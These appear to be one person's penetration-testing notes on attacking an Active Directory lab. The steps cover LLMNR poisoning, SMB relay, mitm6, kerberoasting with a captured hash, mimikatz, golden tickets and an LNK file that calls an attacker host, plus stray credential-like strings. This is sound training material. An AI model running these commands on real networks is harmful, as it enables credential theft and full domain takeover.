HYDRA-DC 10.0.2.250
punisher 10.0.2.220
spiderman 10.0.2.221

# INTERNAL ATTACKS
1. Start with mitm6 and responder
2. Scan to generate traffic
3. Check websites and look for alternate paths
4. Look for default creds / low hanging fruit
5. What else can I do?

## LLMNR POISON
*This attack works because a machine in an AD environment requests access to a named service that doesn't exist. The connection fails, and the attacker requests the user:hash to connect the target to the nonexistent service. The target sends the user:hash and attacker can use them for a hashcrack.

Use Responder to capture and poison LLMNR traffic. 

```
sudo responder -I <adapter> -dPv
```

*Note use either the -w OR the -P tag, as WPAD and PROXY server ARE mutually exclusive*

To identify a hashcat mode for hashes try 

```
hashcat --help | grep <hashtype>
```


hashcat basic attacks 

```
  Attack-          | Hash- |
  Mode             | Type  | Example command
 ==================+=======+==================================================================
  Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict
  Association      | $1$   | hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best64.rule

```




For example
![[Pasted image 20250218154356.png]]1


## SMB Relay
*Use responder to catch and relay hashes to gain control of a system (pass-the-hash)*

**Detect vulnerable targets**

```
nmap --script=smb2-security-mode.nse -p 445 <target>
```
 Look for 
```
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```


**Disable SMB and HTTP in responder**

```
sudo vim /etc/responder/Responder.conf

or

sudo vim /usr/share/responder/Responder.conf
```

![[Pasted image 20250219153007.png]]

**Run Responder**

```
sudo responder -I <interface> -dP
##the -dw option may be used, but it may lose some funcion
```

**Set up a SMB relay**

```
sudo ntlmrelayx.py -tf targets.txt -smb2support
```
```
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```

Now you should receive alerts as they come in and be able to connect
![[Pasted image 20250429220147.png]]

Now if you want to connect use the command
```
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
```
to interface with the box. That will look like this 
![[Pasted image 20250429220318.png]]
then to connect use the command
```
nc 127.0.0.1 11000
```
![[Pasted image 20250429220425.png]]
which will open a prompt to control the machine.
You can also add the -c tag to execute commands on the machine like this
```
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c <command>
```

## Shell Access 
*This works once you have gained either a password or a hash*

Start psexec in MSF
```
msfconsole
use exploit/windows/smb/psexec
## configure it
set payload windows/x64/meterpreter/reverse_tcp
## Don't forget you may need to change the payload!!
run
```
Run psexec manually with a password
```
impacket-psexec <domain>/<user>:'<pass>'@<DC-IP>
```
Run psexec manually with a hash
```
impacket-psexec <user>@<DC-IP> -hashes <LM>:<NT>
```



## IPv6 DNS Takeover
*This attack uses the unused IPv6 system to impersonate an IPv6 DNS and runs MiTM with the DC*

| Conditions                |
| ------------------------- |
| DNS                       |
| IPv6 enabled and not used |

| Triggers       | Event                       |
| -------------- | --------------------------- |
| Machine Reboot | LDAP Dump                   |
| DA Login       | Domain user account created |

Start by running 
```
sudo mitm6 -d <domain>
## And on another terminal
impacket-ntlmrelayx -6 -t ldaps://<DC-IPv4> -wh <fakeservicename>.<domain>.<local (if applicable)> -l <host loot folder>
```

Now wait for events and check the loot folder and you should see things like
![[Pasted image 20250430093930.png]]

![[Pasted image 20250430093906.png]]
Going into Domain users by group we see
![[Pasted image 20250430094337.png]]
![[Pasted image 20250430094006.png]]
Now if we wait for an admin to login we see

![[Pasted image 20250430112926.png]]
To run the secrets-dump script use
```
impacket-secretsdump <Domain>/<DU-User>:'<DU-Pass>'@<DC-IP>
```
![[Pasted image 20250430115017.png]]
qKaDjJwNBv:9lg1PhKV4Prk{m3 
MeVInaZbgo:(E1kbB@j7#->qh( 
## Passback Attack
*Old, but may still work*

What is an MFP? Multi-Function Peripheral 

Also try checking [this](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack) out
"**Introducing the Pass-Back Attack**
The stored LDAP credentials are usually located on the network settings tab in the online configuration of the MFP and can typically be accessed via the Embedded Web Service (EWS). If you can reach the EWS and modify the LDAP server field by replacing the legitimate LDAP server with your malicious LDAP server, then the next time an LDAP query is conducted from the MFP, it will attempt to authenticate to your LDAP server using the configured credentials or the user-supplied credentials."

# POST-MACHINE COMPROMISE 
1. Try for easy wins
	1. Kerberoasting
	2. Secretsdump
	3. Pass the X
2. Dig Deeper!
	1. Enumeration 
		1. Bloodhound 
		2. Plumhound
		3. PingCastle
		4. ldapdomaindump
	2. What can I access with this account
	3. Any old vulns?

## LDAP Domain Dump
*As previously seen in MiTM6*
```
sudo ldapdomaindump ldaps://<LDAP_server> -u '<User>' -p <Password> -o <output_file>
```

## Bloodhound
*Most common AD enumeration tool*

Spin up web console
```
sudo neo4j console
```
Now Bloodhound
```
sudo bloodhound
```
password neo4j1

Now we will use the bloodhound-python ingester
```
sudo bloodhound-python -d <domain> -u <User> -p <Password> -ns <IP> -c all
```

![[Pasted image 20250430142413.png]]
![[Pasted image 20250430142408.png]]
![[Pasted image 20250430142458.png]]

There are lots if different avenues to pursue here, and a huge strength of it is being able to visualize AD structures/trusts/relationships.

## Plumhound
*A Bloodhound wrapper designed to create AD reports*

With Bloodhound running run for basic usage
```
sudo python3 PlumHound.py --easy -p <password to bloodhound>
```

For a default scan run 
```
sudo python3 PlumHound.py -x /tasks/default.tasks -p <password to bloodhound>
```

Click [here](https://github.com/PlumHound/PlumHound) to see the documentation

## PingCastle
*AD audit tool*
Click [here](https://www.pingcastle.com/download/) to download the app
Click [here](https://github.com/netwrix/pingcastle) to download from github

## Pass-Attacks

Pass the Password
```
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
```

Pass the Hash
```
crackmapexec smb <ip/CIDR> -u <user> -h <hash> --local-auth
```
You can also add the 
```
--sam
--shares
--lsa
```

To view additional modules
```
crackmapexec smb -L
```

For LSASS dump
```
crackmapexec smb <ip/CIDR> -u <user> -h <hash> --local-auth
```


## Kerberoasting

Grab SPN's, and dump hashes
```
impacket-GetUserSPNs <DOMAIN/user:pass> -dc-ip <ip> -request
```
Crack the Hash
```
hashcat -m 13100 <hash.txt> <wordlist.txt>
```

```
impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.250 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                            Name        MemberOf                                                     PasswordLastSet             LastLogon  Delegation 
----------------------------------------------  ----------  -----------------------------------------------------------  --------------------------  ---------  ----------
DomainController/SQLService.MARVEL.local:60111  sqlservice  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2025-04-29 18:53:18.402395  <never>               
SQLService/MARVEL.local                         sqlservice  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2025-04-29 18:53:18.402395  <never>               
HYDRA-DC/SQLService.MARVEL.local:60111          sqlservice  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2025-04-29 18:53:18.402395  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlservice$MARVEL.LOCAL$MARVEL.local/sqlservice*$e3f9f3a5bdc0ced4959790704f89b81a$84d8cd5611e64399beee3a5346a24ea1849a3cda6ea1eff623ffe6971ba06bbe06c0bbc67c61b22b386fde03ab975a40630108ef155f4c7ec25d67e8c7228c2806f21986f5226dbf21c8190b45156654c1315ed06baaba0b1b9c5beda7aa8cacd25e466d223b883944b62a871feae4ff765bfaa91a879de05d45995ad2924ad19bceb005da6ba27cde6b93c4fcd4884b71e4d6d522422aa2808502d1524f29d736cb0d16ec28d53f57c062ef2a0b9fcc691069341e335a36c36bcc36b0abdedfa0a275b1ee5a90008d273a64160e95a2494af8cbcc3b2694b547ac4aa881fb53610691b370d6664a8d9c7546eaaa4d5e7034a5b2a9612ab196a86e249802412f27bc48b32d3fe58bdfa548882aa7f754050def0782c5f021d8223b7d4d29cc1f8c34772aabb4f36996de230f5f4b23e5e4640a8bcb91b51d72084ee86ad5817da77704e2174a0b92f5b22f71ba6ec007d6d9830ed0ea59a45f4e1c2dd2cabe56c96729dd422f416cbd67b31ed81dc714f22c0c865da6db672950fd9db9a3a07523ec98048bb27d6dfb73d65051976a5734c8362b2438e9e55514b2071ae6c84a98c1998571191ca25d59f73af52ded477264d7b1a26bd50b29f8749f41254479fbcef6e89cd9802873ec40f86c639ca723944771140b1e674cc0d343866ee865ce844b771484187b1832de1aa6b877107d1184dccfec0a2a4f436ab4186a077ba6cbc5857c827179bdb224d9a98cd913bc13519c3d3bcab2f92e8405677d616d28d83701dc78e3963750bb29af77468248c54ab41ac8b0e13d06a18e495b6c0942f54b01d4d52e4c09ac8b73e984fc13091dfd59fda2ffe04a688336a85cc8f7b1f7307bb8929fc0db80901a25fdb678a7af2e7ac6829b60d78777d8da179bcee62c7f1abadc20c27535276ff44e5d411f9ef842a5d086ec96fd2161a46689e8db8df590627f80ebdecdf417067f43c9e1b08574b5c682b27c1eb3a0336a908cbdc8dd04db5abcddae9224ef8dcc29542ec63761a9f236ad56a73aeb186a70b2764590950bf9d94f8d4d56b03b3730f07473a32410d1d21dc953e88443acf02207e1541ddcdf376bc36e08f2c205d94285121f39739bb59c5a3e8db0ca570c1ea50211151f279a2adc793bd7b29772ddff7798fa9c5817263b6f5d06a25d9581538a83549ebf83d943a6b5ede2c2f57deebaa4e64c731d5c898ecb92fe2ff32267f59380c4c62f4ce59da08273391b85b231b77b9a22c812d5aafef813d60cef26bbf111e4890017df849709810d3edcdc5e04e7c28adc64b9ee880f8b51348413e56b83e75c2c918752f2b2ac822b2f14255f5e9ce37537e10cdbb03f53ff93c60200423ebba81da228ca2fc227758cedad2f05ebfb6414326af35c78fe0c44c134dec23070c83c0e310332947f04e2fdf16f05fd2247ca5b1da9697fdd32de244cb9010122535b360e34e9fce5c219df3e8f312abbf69f92c56b8a0b1e69a568b486b53b66e80641bf1990966ec6e5226ada2c
```
To fix clock skew
```
sudo ntpdate -du <DC IP>
```


## Token Impersonation
*Who needs using incognito mode on your computer when you can use it on a friends?*

Start with a Meterpreter shell.
```
meterpreter > use incognito
Loading extension incognito...success.
meterpreter > help

Incognito Commands
==================

    Command              Description
    -------              -----------
    add_group_user       Attempt to add a user to a global group with all tokens
    add_localgroup_user  Attempt to add a user to a local group with all tokens
    add_user             Attempt to add a user with all tokens
    impersonate_token    Impersonate specified token
    list_tokens          List tokens available under current user context
    snarf_hashes         Snarf challenge/response hashes for every token

meterpreter >
```


```
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
SNEAKS.IN\Administrator

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter >
```
## LNK File Attack
*Create a watering hole file to link back to your server to trigger Responder*

In PowerShell (on any machine) run this to create the file.
```
$objShell = New-Object -ComObject WScript.shell 
$lnk = $objShell.CreateShortcut("C:\test.lnk") 
$lnk.TargetPath = "\\<attack-ip>\@test.png" 
$lnk.WindowStyle = 1 
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
$lnk.Description = "Test" 
$lnk.HotKey = "Ctrl+Alt+T" 
$lnk.Save()`
```
To automate this run
```
netexec smb <Target IP> -d <Domain> -u <User> -p <Password> -M slinky -o NAME=test SERVER=<Domain IP>
```
For more info check [here](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf)

## GPP/ cPassword Attacks
*Old, but who knows, it may just work out*
Patched in MS14-025
This will sometimes find user:pass pairs stored on old GPP

In Metasploit use smb_enum_gpp

## Mimikatz
To start, just download the file onto the compromised windows host
On Kali you can upload it from Meterpreter with this command
```
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```
Then run it
```
mimikatz.exe
```
Some things to try
```
privilege::
sekurlsa::logonpasswords
sekurlsa::tickets
sekurlsa::tickets /export
```
Get SID
```
(Get-ADDomain).DomainSID.Value
```
S-1-5-21-1658060322-2034742339-247117061

# POST-DOMAIN COMPROMISE 
*What to do now?*
1. Total control
2. Do it again, provide more value
### NTDS.dit
*This is a AD database for user, group & password hashes*
Run the secretsdump script on the DC 
*Note: Excel can efficiently separate nt:lm and usernames from the hashlist*

```
hashcat -m 1000 <hashes.txt> <wordlist>
```
### Golden Ticket
*Who wants access to a chocolate factory when you can control any machine on the domain*
You need these to generate a golden ticket
	1. SID
	2. krbtgt hash
Start by running mimikatz
```
privilege:debug
lsadump::lsa /inject /name:krbtgt
```
![[Pasted image 20250506150842.png]]
```
kerberos::golden /User:<User> /domain:<domain> /sid:<SID> /krbtgt:<krbtgt> /id:500 /ptt
```
If in desktop, you can start a shell from mimikatz
```
misc::cmd
```

### ZeroLogon
*Probably don't run it, just scan for it*
[Here](https://github.com/SecuraBV/CVE-2020-1472) is the scanner for ZeroLogon
[Here](https://github.com/dirkjanm/CVE-2020-1472) is the exploit
If you do run this, **make sure to change the password back, otherwise it will stay broken**

### PrintNightmare
*Probably don't run it, just scan for it*
[CVE](https://github.com/cube0x0/CVE-2021-1675) Information
[Exploit](https://github.com/calebstewart/CVE-2021-1675) Information